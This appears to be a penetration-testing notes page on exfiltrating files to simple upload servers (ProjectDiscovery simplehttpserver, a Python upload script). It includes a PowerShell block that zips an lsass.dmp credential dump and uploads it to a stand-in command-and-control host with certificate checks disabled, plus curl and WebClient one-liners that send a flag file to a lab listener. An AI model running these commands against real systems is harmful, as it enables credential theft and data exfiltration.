# Using Curl to POST data to SimpleHTTPServerWithUpload.py


## ProjectDiscovery [SimpleHTTPServer](../../Infrastructure_Setup/Simple_Python_Go_Packages.html#projectdiscovery-simplehttpserver)
* Simple command for running
    ```bash
    simplehttpserver -https -upload
    simplehttpserver -https -upload -listen 0.0.0.0:443
    ```
* Upload a file via [curl](../Useful_Commands/Linux.html#upload-files-via-curl)(Linux) or [powershell](../Useful_Commands/Windows.html#download-uploading-files)(Windows). Try to [compress](../Network/Data_Exfiltration/Windows-Archiving_and_Compression.md#powershell) first
    * Windows
       * Powershell (Possible to convert to one-liner and execute via *cmd*>`powershell "<b;e;l;o;w;>"`)
          ```powershell
          Compress-Archive -LiteralPath C:\Windows\temp\lsass.dmp -DestinationPath C:\Windows\temp\lsass.zip
          [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
          
          $uri='https://c2.attacker.com/lsass.zip'
          $uploadPath = 'C:\Windows\temp\lsass.zip'
          Invoke-RestMethod -Uri $uri -Method Put -InFile $uploadPath -UseDefaultCredentials" 
          ```


---
## Python3 SimpleHTTPServer
* Caveats
   * Insecure communications (HTTP)
       * Choose a server that accepts POST request and makes use of HTTPS
* Download
   * [SimpleHTTPServerwithUpload_Python3](https://gist.github.com/touilleMan/eb02ea40b93e52604938) from @touilleMan
* Modify listening port
   * If you want to change the port that the script is listening to (by default 8000/tcp), use below to replace function "test". (i.e. 1337/tcp)
       ```python
       def test(HandlerClass=SimpleHTTPRequestHandler, ServerClass=http.server.HTTPServer):
       server_address = ('', 1337)
       httpd = ServerClass(server_address,HandlerClass)
       httpd.serve_forever()
       ```
* From client-side
* Once SimpleHTTPServer is running then: (`#!bash python3 SimpleHTTPServerWithUpload.py`)
   * Linux
       ```bash
       curl -F "file=@flag.zip" http://10.1.2.3:8000/
       ```
   * Powershell
       ```powershell
       $wc=New-Object System.Net.WebClient;$resp=$wc.UploadFile('http://10.1.2.3:8000',"C:\Users\Administrator\Desktop\flag.zip")
       ```
